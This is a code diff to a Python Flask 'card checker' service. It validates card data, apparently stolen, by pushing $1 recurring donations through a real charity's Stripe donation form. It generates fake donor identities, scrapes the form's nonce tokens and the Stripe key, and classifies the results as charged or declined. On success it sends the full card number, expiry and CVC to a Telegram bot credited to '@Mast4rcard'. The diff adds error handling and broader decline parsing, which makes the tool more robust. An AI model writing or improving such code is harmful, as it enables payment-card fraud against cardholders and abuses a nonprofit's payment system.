@@ -353,55 +353,161 @@ class StripeProcessor:
         return first_name, last_name
     
     def generate_email(self):
-        name = ''.join(random.choices(string.ascii_lowercase, k=20))
+        name = ''.join(random.choices(string.ascii_lowercase, k=12))
         number = ''.join(random.choices(string.digits, k=4))
         return f"{name}{number}@gmail.com"
     
-    def generate_phone(self):
-        number = ''.join(random.choices(string.digits, k=7))
-        return f"303{number}"
+    def safe_regex_search(self, pattern, text, group_num=1, default="NOT_FOUND"):
+        """Safely search for regex pattern, return default if not found"""
+        try:
+            match = re.search(pattern, text)
+            if match:
+                return match.group(group_num)
+            return default
+        except:
+            return default
+    
+    def extract_json_error(self, text):
+        """Safely extract error message from JSON response"""
+        try:
+            # Try to parse as JSON first
+            data = json.loads(text)
+            if 'errors' in data:
+                # Try different error formats
+                if isinstance(data['errors'], dict):
+                    for key in data['errors']:
+                        if 'message' in data['errors'][key]:
+                            return data['errors'][key]['message']
+                        elif isinstance(data['errors'][key], list) and len(data['errors'][key]) > 0:
+                            return str(data['errors'][key][0])
+                return str(data['errors'])
+        except:
+            pass
+        
+        # Fallback regex patterns
+        patterns = [
+            r'"message":\s*"([^"]+)"',
+            r'"error":\s*"([^"]+)"',
+            r'"reason":\s*"([^"]+)"',
+            r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
+            r'error[^>]*>(.*?)<'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text, re.IGNORECASE)
+            if match:
+                error_text = match.group(1).strip()
+                if error_text and len(error_text) < 100:  # Sanity check
+                    return error_text
+        
+        # Check for common error indicators
+        if 'declined' in text.lower():
+            return "Card declined"
+        elif 'insufficient' in text.lower():
+            return "Insufficient funds"
+        elif 'invalid' in text.lower():
+            return "Invalid card"
+        elif 'incorrect' in text.lower():
+            return "Incorrect details"
+        elif 'expired' in text.lower():
+            return "Card expired"
+        elif 'security' in text.lower():
+            return "Security check failed"
+        
+        return "Unknown error - check logs"
     
     def process_card(self, card_data, bot_token=None, chat_id=None):
         try:
-            n, mm, yy, cvc = card_data.split('|')
-            n = n.strip()
-            mm = mm.strip()
-            yy = yy.strip().zfill(2)[-2:]
-            cvc = cvc.strip().replace('\n', '').replace('\r', '')
+            # Parse card data safely
+            parts = card_data.split('|')
+            if len(parts) < 4:
+                return False, "Invalid card format. Use: number|mm|yy|cvc"
             
+            n = parts[0].strip()
+            mm = parts[1].strip()
+            yy = parts[2].strip().zfill(2)[-2:]
+            cvc = parts[3].strip().replace('\n', '').replace('\r', '')
+            
+            # Validate card number
+            if not n.isdigit() or len(n) < 15 or len(n) > 16:
+                return False, "Invalid card number"
+            
+            # Generate fake data
             first_name, last_name = self.generate_full_name()
             email = self.generate_email()
             
-            cookies = {
-                'charitable_session': 'c367ed103a782e0e8516bbd5c71ac264||86400||82800',
-                '__stripe_mid': 'dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1',
-                '__stripe_sid': 'b081920f-09ae-4e5a-9521-b0e96396026f5f3300',
-            }
-            
-            headers = {
+            # Setup session with proper headers
+            self.session.headers.update({
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+            })
+            
+            # Get donation page
+            try:
+                response = self.session.get('https://pipelineforchangefoundation.com/donate/', timeout=10)
+                if response.status_code != 200:
+                    return False, f"Page error: {response.status_code}"
+                
+                page_text = response.text
+                
+                # Extract required tokens with fallbacks
+                formid = self.safe_regex_search(r'name="charitable_form_id" value="(.*?)"', page_text)
+                nonce = self.safe_regex_search(r'name="_charitable_donation_nonce" value="(.*?)"', page_text)
+                campaign_id = self.safe_regex_search(r'name="campaign_id" value="(.*?)"', page_text)
+                pk_live = self.safe_regex_search(r'"key":"(.*?)"', page_text)
+                
+                if "NOT_FOUND" in [formid, nonce, campaign_id, pk_live]:
+                    return False, "Failed to extract page tokens"
+                    
+            except requests.exceptions.RequestException as e:
+                return False, f"Connection failed: {str(e)}"
+            
+            # Create payment method via Stripe API
+            payment_data = {
+                'type': 'card',
+                'billing_details[name]': f'{first_name} {last_name}',
+                'billing_details[email]': email,
+                'billing_details[address][city]': 'New York',
+                'billing_details[address][country]': 'US',
+                'billing_details[address][line1]': '123 Main St',
+                'billing_details[address][postal_code]': '10080',
+                'billing_details[address][state]': 'NY',
+                'billing_details[phone]': '1234567890',
+                'card[number]': n,
+                'card[cvc]': cvc,
+                'card[exp_month]': mm,
+                'card[exp_year]': yy,
+                'guid': 'beb24868-9013-41ea-9964-7917dbbc35582418cf',
+                'muid': 'dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1',
+                'sid': '911f35c9-ecd0-4925-8eea-5f54c9676f2a227523',
+                'payment_user_agent': 'stripe.js/be0b733d77; stripe-js-v3/be0b733d77; card-element',
+                'key': pk_live
             }
             
-            response = self.session.get('https://pipelineforchangefoundation.com/donate/', 
-                                      cookies=cookies, headers=headers)
+            try:
+                payment_resp = self.session.post(
+                    'https://api.stripe.com/v1/payment_methods',
+                    data=payment_data,
+                    timeout=10
+                )
+                
+                payment_json = payment_resp.json()
+                
+                if 'id' in payment_json:
+                    payment_id = payment_json['id']
+                elif 'error' in payment_json:
+                    return False, f"Stripe: {payment_json['error'].get('message', 'Payment method failed')}"
+                else:
+                    return False, "No payment ID received"
+                    
+            except Exception as e:
+                return False, f"Payment API error: {str(e)}"
             
-            formid = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
-            nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
-            campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
-            pk_live = re.search(r'"key":"(.*?)"', response.text).group(1)
-            
-            payment_data = f'type=card&billing_details[name]={first_name}+{last_name}&billing_details[email]={email}&billing_details[address][city]=New+york&billing_details[address][country]=US&billing_details[address][line1]=New+york+new+states+1000&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=012434816444&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1&sid=911f35c9-ecd0-4925-8eea-5f54c9676f2a227523&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=168797&key={pk_live}'
-            
-            payment_headers = {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Referer': 'https://js.stripe.com/',
-            }
-            
-            payment_resp = self.session.post('https://api.stripe.com/v1/payment_methods', 
-                                           headers=payment_headers, data=payment_data)
-            payment_id = payment_resp.json()['id']
-            
+            # Submit donation
             donation_data = {
                 'charitable_form_id': formid,
                 formid: '',
@@ -415,48 +521,78 @@ class StripeProcessor:
                 'custom_recurring_donation_amount': '1.00',
                 'recurring_donation_period': 'week',
                 'custom_donation_amount': '1.00',
-                'first_name': 'ftx',
-                'last_name': first_name,
+                'first_name': first_name,
+                'last_name': last_name,
                 'email': email,
-                'address': 'ftxbabatek nea',
-                'city': 'new york',
-                'state': '100p',
+                'address': '123 Main St',
+                'city': 'New York',
+                'state': 'NY',
                 'postcode': '10080',
                 'country': 'US',
-                'phone': '02026726732',
+                'phone': '1234567890',
                 'gateway': 'stripe',
                 'stripe_payment_method': payment_id,
                 'action': 'make_donation',
                 'form_action': 'make_donation',
             }
             
-            ajax_headers = {
-                'X-Requested-With': 'XMLHttpRequest',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Referer': 'https://pipelineforchangefoundation.com/donate/',
-            }
-            
-            final_resp = self.session.post(
-                'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
-                cookies=cookies,
-                headers=ajax_headers,
-                data=donation_data,
-            )
-            
-            result_text = final_resp.text
-            
-            if 'Thank you for your donation' in result_text or 'Thank you' in result_text or 'Successfully' in result_text:
-                if bot_token and chat_id:
-                    message = f"Stripe Charge Donate1$ ✅\\n━━━━━━━━━━━━━━━━\\n[↯] CC ⇾ {n}|{mm}|{yy}|{cvc}\\n[↯] Gate ⇾ Stripe Charge 1$\\n[↯] Status ⇾ APPROVED ✅\\n[↯] Response ⇾ CHARGED 🟢\\n━━━━━━━━━━━━━━━━\\n[↯] Bot By ⇾ @Mast4rcard"
-                    self.session.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                    params={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'})
-                return True, "Charge 1.00$ ✅"
-            elif 'requires_action' in result_text:
-                return False, "requires_action"
-            else:
-                error_match = re.search(r'"errors":\s*{.*?"message":\s*"([^"]+)"', result_text)
-                error_msg = error_match.group(1) if error_match else "Unknown error"
-                return False, error_msg
+            try:
+                final_resp = self.session.post(
+                    'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
+                    data=donation_data,
+                    timeout=15
+                )
+                
+                result_text = final_resp.text
+                
+                # Check for success
+                success_indicators = [
+                    'Thank you for your donation',
+                    'Thank you',
+                    'Successfully',
+                    'donation has been received',
+                    'payment was successful',
+                    'completed successfully'
+                ]
+                
+                for indicator in success_indicators:
+                    if indicator.lower() in result_text.lower():
+                        # Send Telegram notification if configured
+                        if bot_token and chat_id:
+                            try:
+                                message = f"Stripe Charge Donate1$ ✅\n━━━━━━━━━━━━━━━━\n[↯] CC ⇾ {n}|{mm}|{yy}|{cvc}\n[↯] Gate ⇾ Stripe Charge 1$\n[↯] Status ⇾ APPROVED ✅\n[↯] Response ⇾ CHARGED 🟢\n━━━━━━━━━━━━━━━━\n[↯] Bot By ⇾ @Mast4rcard"
+                                self.session.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    params={
+                                        'chat_id': chat_id,
+                                        'text': message,
+                                        'parse_mode': 'HTML'
+                                    },
+                                    timeout=5
+                                )
+                            except:
+                                pass  # Don't fail if Telegram fails
+                        
+                        return True, "Charge 1.00$ ✅"
+                
+                # Check for specific errors
+                if 'requires_action' in result_text.lower():
+                    return False, "3D Secure required"
+                elif 'declined' in result_text.lower():
+                    return False, "Card declined"
+                elif 'invalid' in result_text.lower():
+                    return False, "Invalid card"
+                elif 'insufficient' in result_text.lower():
+                    return False, "Insufficient funds"
+                elif 'expired' in result_text.lower():
+                    return False, "Card expired"
+                else:
+                    # Try to extract error message
+                    error_msg = self.extract_json_error(result_text)
+                    return False, error_msg
+                    
+            except Exception as e:
+                return False, f"Donation submit error: {str(e)}"
                 
         except Exception as e:
             return False, f"Processing error: {str(e)}"
@@ -482,6 +618,10 @@ def process():
         'card': card
     })
 
+@app.route('/health')
+def health():
+    return jsonify({'status': 'online'})
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False)
